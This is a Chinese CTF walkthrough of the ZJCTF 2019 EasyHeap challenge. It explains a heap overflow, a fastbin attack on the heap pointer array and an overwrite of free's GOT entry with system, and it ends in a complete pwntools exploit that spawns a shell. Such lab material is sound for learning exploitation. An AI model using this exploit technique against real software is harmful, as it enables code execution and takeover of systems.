# 0x03 例题2 [ZJCTF 2019]EasyHeap （fastbin attack
https://www.freebuf.com/articles/endpoint/371095.html
## 1. 分析程序

本题的漏洞是fastbin attack,一个没有打印内容的菜单题目。
```
(ctf) root@ca8c26ccc565:~/AutoExpMarkDocker# ./data/nolabel/ZJCTF_2019_EasyHeap
--------------------------------
       Easy Heap Creator
--------------------------------
 1. Create a Heap
 2. Edit a Heap
 3. Delete a Heap
 4. Exit
--------------------------------
Your choice :
```
此处不限制输入长度，有堆溢出漏洞。
```c
unsigned __int64 edit_heap()
{
  int v1; // [rsp+4h] [rbp-1Ch]
  size_t v2; // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4u);
  v1 = atoi(buf);
  if ( (unsigned int)v1 >= 0xA )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&heaparray + v1) )
  {
    printf("Size of Heap : ");
    read(0, buf, 8u);
    v2 = atoi(buf);
    printf("Content of heap : ");
    read_input(*(&heaparray + v1), v2);     //heap overflow
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v4;
}
```

## 2.整体思路
我们使用0x01的思想，覆盖调用函数，把free的got表掉包成system的plt表，不就可以执行system（堆指针）了吗？那么此时如果堆指针存着‘/bin/sh’，我们就可以执行system（‘/bin/sh’）提权了。（注意字符串实际上就是一个指针，并且结尾是‘\x00’）

>这里是删除堆的函数，会执行free(堆指针)并且进行指针清零，所以不能用UAF，但是可以整fastbin attack。

```c
unsigned __int64 delete_heap()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4u);
  v1 = atoi(buf);
  if ( (unsigned int)v1 >= 0xA )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&heaparray + v1) )
  {
    free(*(&heaparray + v1));
    *(&heaparray + v1) = 0;     //no UAF, but fastbin attack
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

>感觉这里相当于栈溢出的ret2sys

## 3.利用过程讲解
### 3.1 需要用到的堆

先创建三个堆，分别为heap0，heap1，heap2。
```python
add(0x68,b'6')#0
add(0x68,b'6')#1 
add(0x68,b'6')#2
```
### 3.2 李代桃僵

heap2是fastbin attack的排头兵，他用来被送到fastbin attack，然后修改他的fd指针为程序存放heap指针的数组（下面简称为数组）。

这样在申请内存时根据fastbin的先进先出，先申请到heap2，然后就是申请到数组作为伪装堆。

``` 
.bss:00000000006020C8 ??? ??? ??? ??? ??? ??? ??? ???+align 20h
.bss:00000000006020E0                                         public heaparray
.bss:00000000006020E0                                         ; void *heaparray
.bss:00000000006020E0 ??? ??? ??? ??? ??? ??? ??? ???         heaparray dq ?
.bss:00000000006020E0                                         ; DATA XREF: create_heap+74↓o
.bss:00000000006020E0                                         ; create_heap+8C↑o ...
.bss:00000000006020E0                                         ; create_heap+99↑o
.bss:00000000006020E0                                         ; create_heap+CE↑o
.bss:00000000006020E0                                         ; edit_heap+70↑r
.bss:00000000006020E0                                         ; edit_heap+C8↑r
.bss:00000000006020E0                                         ; delete_heap+70↑r
.bss:00000000006020E0                                         ; delete_heap+82↑r
.bss:00000000006020E0                                         ; delete_heap+97↑r
.bss:00000000006020E8 ???                                     db    ?
.bss:00000000006020E9 ???                                     db    ?
.bss:00000000006020EA ???                                     db    ?
.bss:00000000006020EB ???                                     db    ?
.bss:00000000006020EC ???                                     db    ?
.bss:00000000006020ED ???                                     db    ?
.bss:00000000006020EE ???                                     db    ?
.bss:00000000006020EF ???                                     db    ?
.bss:00000000006020F0 ???                                     db    ?
.bss:00000000006020F1 ???                                     db    ?
.bss:00000000006020F2 ???                                     db    ?
.bss:00000000006020F3 ???                                     db    ?
.bss:00000000006020F4 ???                                     db    ?
.bss:00000000006020F5 ???                                     db    ?
.bss:00000000006020F6 ???                                     db    ?
.bss:00000000006020F7 ???                                     db    ?
.bss:00000000006020F8 ???                                     db    ?
.bss:00000000006020F9 ???                                     db    ?
```

``` 
f 2      0x7f81aa220840 __libc_start_main+240
f 3      0x4007b9 _start+41
pwndbg> x/20gx  0x6020E0
0x6020e0 <heaparray>:    0x0000000000000000  0x0000000000000000
0x6020f0 <heaparray+16>: 0x0000000000000000  0x0000000000000000
0x602100 <heaparray+32>: 0x0000000000000000  0x0000000000000000
0x602110 <heaparray+48>: 0x0000000000000000  0x0000000000000000
0x602120 <heaparray+64>: 0x0000000000000000  0x0000000000000000
0x602130:                0x0000000000000000  0x0000000000000000
0x602140:                0x0000000000000000  0x0000000000000000
0x602150:                0x0000000000000000  0x0000000000000000
0x602160:                0x0000000000000000  0x0000000000000000
0x602170:                0x0000000000000000  0x0000000000000000
pwndbg> x/20gx  0x6020E0-0x30
0x6020b0 <stdin@@GLIBC_2.2.5>: 0x00007f81aa5c48e0  0x0000000000000000
0x6020c0 <magic>:            0x0000000000000000  0x0000000000000000
0x6020d0:                   0x0000000000000000  0x0000000000000000
0x6020e0 <heaparray>:       0x0000000000000000  0x0000000000000000
0x6020f0 <heaparray+16>:    0x0000000000000000  0x0000000000000000
0x602100 <heaparray+32>:    0x0000000000000000  0x0000000000000000
0x602110 <heaparray+48>:    0x0000000000000000  0x0000000000000000
0x602120 <heaparray+64>:    0x0000000000000000  0x0000000000000000
0x602130:                  0x0000000000000000  0x0000000000000000
0x602140:                  0x0000000000000000  0x0000000000000000
pwndbg>
```

0x6020e0是heap指针数组，这里不能直接伪装堆块，因为没有记录大小，我们需要往前找找看看有没有记录到大小的。往前找是为了能写到后面的指针数组。

``` 
0x602150:                0x0000000000000000  0x0000000000000000
0x602160:                0x0000000000000000  0x0000000000000000
0x602170:                0x0000000000000000  0x0000000000000000
pwndbg> x/20gx  0x6020E0-0x30
0x6020b0 <stdin@@GLIBC_2.2.5>: 0x00007f81aa5c48e0  0x0000000000000000
0x6020c0 <magic>:            0x0000000000000000  0x0000000000000000
0x6020d0:                   0x0000000000000000  0x0000000000000000
0x6020e0 <heaparray>:       0x0000000000000000  0x0000000000000000
0x6020f0 <heaparray+16>:    0x0000000000000000  0x0000000000000000
0x602100 <heaparray+32>:    0x0000000000000000  0x0000000000000000
0x602110 <heaparray+48>:    0x0000000000000000  0x0000000000000000
0x602120 <heaparray+64>:    0x0000000000000000  0x0000000000000000
0x602130:                  0x0000000000000000  0x0000000000000000
0x602140:                  0x0000000000000000  0x0000000000000000
pwndbg> x/20gx  0x6020E0-0x33
0x6020ad:                 0x81aa5c48e0000000  0x000000000000007f
0x6020bd:                 0x0000000000000000  0x0000000000000000
0x6020cd:                 0x0000000000000000  0x0000000000000000
0x6020dd:                 0x0000000000000000  0x0000000000000000
0x6020e0 <heaparray>:      0x0000000000000000  0x0000000000000000
0x6020f0 <heaparray+16>:   0x0000000000000000  0x0000000000000000
0x602100 <heaparray+32>:   0x0000000000000000  0x0000000000000000
0x602110 <heaparray+48>:   0x0000000000000000  0x0000000000000000
0x602120 <heaparray+64>:   0x0000000000000000  0x0000000000000000
0x602130:                 0x0000000000000000  0x0000000000000000
0x602140:                 0x0000000000000000  0x0000000000000000
0x602150:                 0x0000000000000000  0x0000000000000000
0x602160:                 0x0000000000000000  0x0000000000000000
0x602170:                 0x0000000000000000  0x0000000000000000
pwndbg> 
```
发现偏移-0x33时，刚好伪装成了大小是0x7f的堆块。

>Fastbins是一种用于存储已释放的小型堆块的堆管理技术。具体的Fastbins大小通常会根据不同的堆实现和系统架构而有所不同。在典型的GNUC库中，Fastbins的大小范围通常是32字节到128字节之间。
```python
free(2) 
#释放到fastbin，进行fastbin attack，具体方式是修改fd为heap指针附近的地址
edit(1,b'/bin/sh\x00'+b'\x00'*0x60+p64(0x71)+p64(0x6020ad))
#在heap1写binsh，0x6020ad是修改fd为刚才定位到的fake heap
```
修改后如下。

``` 
empty
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x21e2000
Size: 0x71

Allocated chunk | PREV_INUSE
Addr: 0x21e2070
Size: 0x71

Free chunk (BinType.FAST) | PREV_INUSE
Addr: 0x21e20e0
Size: 0x71
fd: 0x6020ad

Top chunk | PREV_INUSE
Addr: 0x21e2150
Size: 0x20eb1

pwndbg>
```

### 3.3 移花接木

申请到数组之后，把heap0的地址改为free的got表的地址。
```python
add(0x68,b'6')#把2恢复回来
add(0x68,b'6')#创建fake heap，实际上是heap指针数组前面0x33

edit(3,b'\x00'*0x23+p64(elf.got['free']))#覆盖heap0为free的got表
```
这里是0x23是因为前面有0x10用来存堆头了。
修改前：

``` 
pwndbg> x/20gx  0x6020E0
0x6020e0 <heaparray>:    0x0000000000b33010  0x0000000000b33080
0x6020f0 <heaparray+16>: 0x0000000000b33f00  0x00000000006020bd
0x602100 <heaparray+32>: 0x0000000000000000  0x0000000000000000
0x602110 <heaparray+48>: 0x0000000000000000  0x0000000000000000
0x602120 <heaparray+64>: 0x0000000000000000  0x0000000000000000
0x602130:               0x0000000000000000  0x0000000000000000
0x602140:               0x0000000000000000  0x0000000000000000
0x602150:               0x0000000000000000  0x0000000000000000
0x602160:               0x0000000000000000  0x0000000000000000
0x602170:               0x0000000000000000  0x0000000000000000
pwndbg>
```
修改后：注意看第一个指针已经变成0x602018，即free的got表。
``` 
pwndbg> x/20gx  0x6020E0
0x6020e0 <heaparray>:    0x0000000000602018  0x00000000002225080
0x6020f0 <heaparray+16>: 0x000000000022250f0  0x00000000006020bd
0x602100 <heaparray+32>: 0x0000000000000000  0x0000000000000000
0x602110 <heaparray+48>: 0x0000000000000000  0x0000000000000000
0x602120 <heaparray+64>: 0x0000000000000000  0x0000000000000000
0x602130:               0x0000000000000000  0x0000000000000000
0x602140:               0x0000000000000000  0x0000000000000000
0x602150:               0x0000000000000000  0x0000000000000000
0x602160:               0x0000000000000000  0x0000000000000000
0x602170:               0x0000000000000000  0x0000000000000000
pwndbg>
```

```
.got.plt:0000000000602008 00 00 00 00 00 00 00 00     qword_602008 dq 0
.got.plt:0000000000602010 00 00 00 00 00 00 00 00     qword_602010 dq 0
.got.plt:0000000000602018 38 21 60 00 00 00 00 00     off_602018   dq offset free
.got.plt:0000000000602020 40 21 60 00 00 00 00 00     off_602020   dq offset _exit
.got.plt:0000000000602028 48 21 60 00 00 00 00 00     off_602028   dq offset puts
.got.plt:0000000000602030 50 21 60 00 00 00 00 00     off_602030   dq offset __stack_chk_fail
.got.plt:0000000000602038 58 21 60 00 00 00 00 00     off_602038   dq offset system
.got.plt:0000000000602040 60 21 60 00 00 00 00 00     off_602040   dq offset printf
.got.plt:0000000000602048 68 21 60 00 00 00 00 00     off_602048   dq offset read
.got.plt:0000000000602050 70 21 60 00 00 00 00 00     off_602050   dq offset __libc_start_main
.got.plt:0000000000602058 78 21 60 00 00 00 00 00     off_602058   dq offset malloc
.got.plt:0000000000602060 80 21 60 00 00 00 00 00     off_602060   dq offset setvbuf
.got.plt:0000000000602068 88 21 60 00 00 00 00 00     off_602068   dq offset atoi
.got.plt:0000000000602070 90 21 60 00 00 00 00 00     off_602070   dq offset exit
_got_plt_ends
```
### 3.4 借刀杀人

编辑heap0，此时实际上已经被移花接木为free的got表。我们将free的got表改为system的plt表。
```python
edit(0,p64(elf.plt['system']))#覆盖free的got为system的plt
```
>由于在调用free时，是先找free的plt表，然后跳转到free的got表在执行一次跳转，此时把free的got表改为sysetm的plt，就会调到system去执行。

最后执行free(1)，实际上就是执行system('/bin/sh')，提权成功。
``` 
LEGEND: STACK  |  HEAP  |  CODE  |  DATA  |  RO-data  |  RW-data  |  RWDATA
[ REGISTERS / show-flags off / show-compact-regs off ]
*RAX 0x1995080  ←  0x68732f6e69622f /* '/bin/sh' */
RBX 0x0
RCX 0xffffffffda
RDX 0x0
RDI 0x1995080  ←  0x68732f6e69622f /* '/bin/sh' */
RSI 0x1
R8  0x0
R9  0x1999999999999999
R10 0x547
*R11 0x7fd739a453a0 (system)  ←  test rdi, rdi
R12 0x400790 (_start)  ←  xor ebp, ebp
R13 0x7ffeb6b238a0  ←  0x1
R14 0x0
R15 0x0
*RBP 0x7ffeb6b237a0  →  0x7ffeb6b237c0  →  0x400d50 (__libc_csu_init)  ←  push r15
*RSP 0x7ffeb6b23778  →  0x400be5 (delete_heap+146)  ←  mov eax, dword ptr [rbp - 0x14]
*RIP 0x7fd739a453a0 (system)  ←  test rdi, rdi

[ DISASM / x86-64 / set emulate on ]
► 0x7fd739a453a0 <system>           test    rdi, rdi
  0x7fd739a453a3 <system+3>         je      system+16 <system+16>
↓ 0x7fd739a453a5 <system+5>         jmp     do_system <do_system>
  0x7fd739a44e30 <do_system>        push    r12
  0x7fd739a44e32 <do_system+2>      push    rbp
  0x7fd739a44e33 <do_system+3>      xor     eax, eax
  0x7fd739a44e35 <do_system+5>      push    rbx
  0x7fd739a44e36 <do_system+6>      mov     ecx, 0x10
  0x7fd739a44e3b <do_system+11>     mov     rbx, rdi
  0x7fd739a44e3e <do_system+14>     mov     esi, 1
  0x7fd739a44e43 <do_system+19>     sub     rsp, 0x170

[ STACK ]
00:0000| rsp 0x7ffeb6b23778  →  0x400be5 (delete_heap+146)  ←  mov eax, dword ptr [rbp - 0x14]
01:0008| 0x7ffeb6b23780  →  0x7ffeb6b238a0  ←  0x1
02:0010| 0x7ffeb6b23788  →  0x1000000000
03:0018| 0x7ffeb6b23790  →  0xa31 /* '1\n' */
04:0020| 0x7ffeb6b23798  →  0xef0285bde44b6c00
05:0028| rbp 0x7ffeb6b237a0  →  0x7ffeb6b237c0  →  0x400d50 (__libc_csu_init)  ←  push r15
06:0030| 0x7ffeb6b237a8  →  0x400cf9 (main+197)  ←  jmp    0x400d41
07:0038| 0x7ffeb6b237b0  →  0x7ffeb6b20a33  ←  0xb236a80000000000

[ BACKTRACE ]
 ► f 0      0x7fd739a453a0 system
   f 1      0x400be5 delete_heap+146
   f 2      0x400cf9 main+197
   f 3      0x7fd739a20840 __libc_start_main+240
   f 4      0x4007b9 _start+41

pwndbg>
```

``` 
3. Delete a Heap
4. Exit
----------------------
Your choice :Index :$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x64 bytes:
    b'aaa.py\\theap\\t  heap.id0  heap.id2  heap.til\\t __MACOSX\\n'
    b'exp.py\\theap.i64  heap.id1  heap.nam  libc.so.6\\n'
aaa.py      heap        heap.id0   heap.id2  heap.til   __MACOSX
exp.py      heap.i64    heap.id1   heap.nam  libc.so.6
$
```

## 4.完整exp
```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
#context(os='linux', arch='amd64')

p = process('./heap')
#p = remote('node4.buuoj.cn', 26065)
elf = ELF('./heap')
libc = ELF('./libc.so.6')

n2b = lambda x    : str(x).encode()
rv  = lambda x    : p.recv(x)
ru  = lambda s    : p.recvuntil(s)
sd  = lambda s    : p.send(s)
sl  = lambda s    : p.sendline(s)
sn  = lambda s    : sl(n2b(n))
sa  = lambda t, s : p.sendafter(t, s)
sla = lambda t, s : p.sendlineafter(t, s)
sna = lambda t, n : sla(t, n2b(n))
ia  = lambda      : p.interactive()
rop = lambda r    : flat([p64(x) for x in r])

if args.G:
    gdb.attach(p)

def add(size,content):
    sla(':','1')
    sla(':',str(size))
    sla(':',content)

def edit(idx, content):
    sla(':','2')
    sla(':',str(idx))
    sla(':',str(len(content)))
    sla(':',content)

def free(idx):
    sla(':','3')
    sla(':',str(idx))

add(0x68,b'6')#0 用于写free的got为system
add(0x68,b'6')#1 用于存放binsh和覆盖2
add(0x68,b'6')#2 用于构造fastbin attack，写heap0指针为free的got表
free(2) #释放到fastbin，进行fastbin attack，具体方式是修改fd为heap指针附近的地址

edit(1,b'/bin/sh\x00'+b'\x00'*0x60+p64(0x71)+p64(0x6020ad))
#在heap1写binsh，0x6020ad是刚才定位到的fake heap

add(0x68,b'6')#把2恢复回来
add(0x68,b'6')#创建fake heap，实际上是heap指针数组前面0x33

edit(3,b'\x00'*0x23+p64(elf.got['free']))#覆盖heap0为free的got表
edit(0,p64(elf.plt['system']))#覆盖free的got为system的plt

free(1)#执行system（原来是free）,参数为‘/bin/sh’
ia()
```